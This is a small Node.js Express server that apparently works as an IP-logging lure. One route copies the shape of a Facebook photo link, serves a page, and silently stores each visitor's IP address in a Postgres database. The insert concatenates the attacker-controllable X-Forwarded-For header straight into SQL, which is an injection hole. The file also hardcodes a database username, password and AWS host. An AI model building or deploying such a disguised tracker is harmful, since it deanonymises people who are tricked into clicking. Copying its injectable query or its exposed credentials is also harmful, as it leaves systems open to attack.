var express = require('express');
var app = express();
app.use(express.static('public'));
app.set('view engine','ejs');
const PORT = process.env.PORT || 5000;
const pg = require('pg');
const client = new pg.Client({
    user: 'haaasalbrddacm',
    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
    database: 'de35u0icb8jt5u',
    port: 5432,
    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
    ssl: true
});
client.connect();

app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/735306480197164445',function(req,res){
    res.render('fade7a');
    var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO ipy (ip) VALUES ('" + ip + "')", function (err, result) {
       
})})


app.get('*',function(req,res){
    res.render('fade7a');
})

app.listen(PORT,function(){
    console.log('server started')
})